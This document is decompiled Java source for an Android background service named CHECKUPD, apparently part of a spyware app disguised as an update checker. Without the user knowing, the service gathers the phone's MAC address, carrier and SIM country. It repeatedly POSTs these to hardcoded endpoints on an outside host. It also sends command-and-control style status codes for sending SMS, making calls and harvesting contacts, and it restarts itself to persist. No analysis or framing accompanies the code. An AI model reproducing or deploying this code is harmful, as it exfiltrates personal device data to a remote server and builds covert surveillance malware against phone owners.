package com.savemebeta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.widget.Toast;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class CHECKUPD extends Service implements OnTouchListener {
    public static String Add_Contact;
    public static String EXT_CALL;
    public static String EXT_SMS;
    public static String Mac;
    public static String Make_Call;
    public static String SMS;
    public static String Send_Contact;
    public static String Send_ESms;
    public static String Send_Sms;
    public static String Still_Here;
    public static String country;
    public String address;
    public String carrier;
    Boolean conx = Boolean.valueOf(false);
    Context countr = this;
    Context ctx = this;
    Context ctx2 = this;

    public class senddata extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            CHECKUPD.Mac = CHECKUPD.this.address;
            CHECKUPD.SMS = "TEST";
            CHECKUPD.EXT_SMS = "000000000000";
            CHECKUPD.EXT_CALL = "000000000001";
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/senddata.php");
            List<NameValuePair> nameValuePairs = new ArrayList();
            nameValuePairs.add(new BasicNameValuePair("carrie", CHECKUPD.this.carrier));
            nameValuePairs.add(new BasicNameValuePair("mac", CHECKUPD.Mac));
            nameValuePairs.add(new BasicNameValuePair("TSS", CHECKUPD.SMS));
            nameValuePairs.add(new BasicNameValuePair("EXTS", CHECKUPD.EXT_SMS));
            nameValuePairs.add(new BasicNameValuePair("EXCL", CHECKUPD.EXT_CALL));
            try {
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            try {
                httpClient.execute(httpPost);
            } catch (ClientProtocolException e2) {
                e2.printStackTrace();
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            new Timer().schedule(new TimerTask() {
                public void run() {
                    CHECKUPD.this.startService(new Intent(CHECKUPD.this, GTSTSR.class));
                    CHECKUPD.this.stopSelf();
                }
            }, 1000);
            return null;
        }
    }

    public class sendmyinfos extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            String SendTime = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(Calendar.getInstance().getTime());
            String MAC = CHECKUPD.this.address;
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/install.php");
            List<NameValuePair> nameValuePairs = new ArrayList();
            nameValuePairs.add(new BasicNameValuePair("timea", SendTime));
            nameValuePairs.add(new BasicNameValuePair("teli", "UNKNOWN"));
            nameValuePairs.add(new BasicNameValuePair("carrie", CHECKUPD.this.carrier));
            nameValuePairs.add(new BasicNameValuePair("mac", MAC));
            nameValuePairs.add(new BasicNameValuePair("counta", CHECKUPD.country));
            try {
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            try {
                httpClient.execute(httpPost);
            } catch (ClientProtocolException e2) {
                e2.printStackTrace();
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            new Timer().schedule(new TimerTask() {
                public void run() {
                    new sendmystatus().execute(new Void[0]);
                }
            }, 1000);
            return null;
        }
    }

    public class sendmystatus extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            String SendTime = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(Calendar.getInstance().getTime());
            CHECKUPD.Mac = CHECKUPD.this.address;
            CHECKUPD.Send_Sms = "SSTLAH";
            CHECKUPD.Send_ESms = "SESFK";
            CHECKUPD.Make_Call = "MCLA";
            CHECKUPD.Send_Contact = "SCNAH";
            CHECKUPD.Add_Contact = "ACSIR";
            CHECKUPD.Still_Here = "yes";
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/holla.php");
            List<NameValuePair> nameValuePairs = new ArrayList();
            nameValuePairs.add(new BasicNameValuePair("carrie", CHECKUPD.this.carrier));
            nameValuePairs.add(new BasicNameValuePair("mac", CHECKUPD.Mac));
            nameValuePairs.add(new BasicNameValuePair("SGF", CHECKUPD.Send_Sms));
            nameValuePairs.add(new BasicNameValuePair("SEGF", CHECKUPD.Send_ESms));
            nameValuePairs.add(new BasicNameValuePair("CGF", CHECKUPD.Make_Call));
            nameValuePairs.add(new BasicNameValuePair("CSGF", CHECKUPD.Send_Contact));
            nameValuePairs.add(new BasicNameValuePair("ADGF", CHECKUPD.Add_Contact));
            nameValuePairs.add(new BasicNameValuePair("timea", SendTime));
            nameValuePairs.add(new BasicNameValuePair("checkif", CHECKUPD.Still_Here));
            try {
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            try {
                httpClient.execute(httpPost);
            } catch (ClientProtocolException e2) {
                e2.printStackTrace();
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            new Timer().schedule(new TimerTask() {
                public void run() {
                    new senddata().execute(new Void[0]);
                }
            }, 1000);
            return null;
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        String locale = this.countr.getResources().getConfiguration().locale.getDisplayCountry();
        country = ((TelephonyManager) getSystemService("phone")).getSimCountryIso();
        ConnectivityManager con_manager = (ConnectivityManager) this.ctx2.getSystemService("connectivity");
        if (con_manager.getActiveNetworkInfo() != null && con_manager.getActiveNetworkInfo().isAvailable() && con_manager.getActiveNetworkInfo().isConnected()) {
            this.conx = Boolean.valueOf(true);
        } else {
            this.conx = Boolean.valueOf(false);
        }
        if (this.conx.booleanValue()) {
            this.address = ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
            this.carrier = ((TelephonyManager) getSystemService("phone")).getNetworkOperatorName();
            new sendmyinfos().execute(new Void[0]);
            return;
        }
        new Timer().schedule(new TimerTask() {
            public void run() {
                CHECKUPD.this.startService(new Intent(CHECKUPD.this, restartCHUP.class));
            }
        }, 30000);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onTouch(View v, MotionEvent event) {
        Toast.makeText(this, "REQUEST event", 0).show();
        return false;
    }
}
